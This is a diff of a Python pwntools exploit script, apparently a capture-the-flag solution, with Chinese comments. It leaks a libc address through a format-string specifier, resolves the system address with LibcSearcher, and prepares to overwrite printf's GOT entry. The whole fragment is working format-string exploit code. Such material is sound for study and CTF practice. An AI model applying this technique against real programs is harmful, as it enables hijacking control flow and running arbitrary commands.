@@ -8,11 +8,14 @@ printf_got = elf.got['printf']
 
 p.recvuntil(b'Do you know repeater?\n')
 
-# 获取system的地址
-p.send(b'%22$p')
-libc_system = int(p.recv()[:10], 16) + 0x2fcb2
-system_l = libc_system & 0xff           # system第一个字节的值
-system_h = (libc_system>>8) & 0xffff    # system第二三个字节的值
+# 获取system的地i址
+p.send(b'%63$p')
+libc_start_main = int(p.recv()[:10], 16) - 147
+libc = LibcSearcher('__libc_start_main', libc_start_main)
+libc_base = libc_start_main - libc.dump('__libc_start_main')
+system    = libc_base + libc.dump('system')
+system_l = system & 0xff           # system第一个字节的值
+system_h = (system>>8) & 0xffff    # system第二三个字节的值
 
 # 在buf储存printf的got表地址
 # 通过调用printf(buf)修改buf指向的地址的值, 即printf_got
